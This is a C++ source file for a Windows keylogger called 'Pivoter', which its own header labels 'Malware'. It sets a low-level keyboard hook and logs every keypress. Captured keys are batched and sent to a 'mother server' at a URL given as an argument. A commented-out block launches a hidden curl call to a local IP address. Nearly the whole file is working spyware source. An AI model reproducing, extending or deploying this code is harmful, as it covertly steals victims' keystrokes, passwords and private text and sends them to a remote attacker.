/*
	Project name: Pivoter
	Project 1-Word Description: Malware
	Author: Kevin Jerebica ( Osamu-KJ )
*/

#include <iostream>
#include <string.h>
#include <Windows.h>
#include <WinUser.h>
#include <vector>
#include <thread>
#include "codes.h"
#include "connections_pivoter.h"

#define DEBUG TRUE
#define KEYS_LIMIT 100
HHOOK keyboard_events_hook; 
std::vector<std::string> virt_codes; 
ConnectionsPivoter mother_server_pv = ConnectionsPivoter();

void stack_codes() {
	if (virt_codes.size() < KEYS_LIMIT)
		return; 
	
	bool res = mother_server_pv.send_codes(virt_codes); 
	if (DEBUG && !res)
		std::cout << "Failed sending message to the mother server" << std::endl; 

	virt_codes.clear();
}

LRESULT CALLBACK keyboard_callback(int nCode, WPARAM wParam, LPARAM lParam) {
	if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
		KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)lParam; 
		DWORD virt_code = kbd_struct->vkCode; 

		std::string string_key_code = VIRTUAL_KEY_CODE_TABLE[virt_code].name; 
		if (DEBUG) {
			std::cout << "Key pressed: " << string_key_code << std::endl; 
			std::cout << "Len of the vector: " << virt_codes.size() << std::endl; 
		}

		virt_codes.push_back(string_key_code);
		stack_codes();
	}
	return CallNextHookEx(keyboard_events_hook, nCode, wParam, lParam);
}

int main(int argc, char **argv) {
	
	if (argc != 2) {
		std::cout << "Error: wrong use of arguments!" << std::endl; 
		return 1; 
	}

	if (DEBUG)
		for (int i = 0; i < argc; i++)
			std::cout << "Argument " << i << " value: " << argv[i] << std::endl;

	mother_server_pv.set_url(argv[1]); 

	keyboard_events_hook = SetWindowsHookExA(WH_KEYBOARD_LL, keyboard_callback, 0, 0); 

	STARTUPINFOA startup_info; 
	PROCESS_INFORMATION process_info; 

	memset(&startup_info, 0, sizeof(STARTUPINFOA)); 
	memset(&process_info, 0, sizeof(PROCESS_INFORMATION)); 
	startup_info.cb = sizeof(startup_info); 
 
	/*BOOL test = CreateProcessA(
		NULL,
		(LPSTR) "curl http://192.168.1.108",
		NULL, 
		NULL, 
		false, 
		CREATE_NO_WINDOW,
		NULL, 
		NULL,
		&startup_info,
		&process_info);
	if (test == FALSE) {
		std::cout << "problem!" << std::endl; 
	}*/
	
	// EVENT LOOP
	while (GetMessage(NULL, NULL, 0, 0)); 

	UnhookWindowsHookEx(keyboard_events_hook);

	return 0; 
}
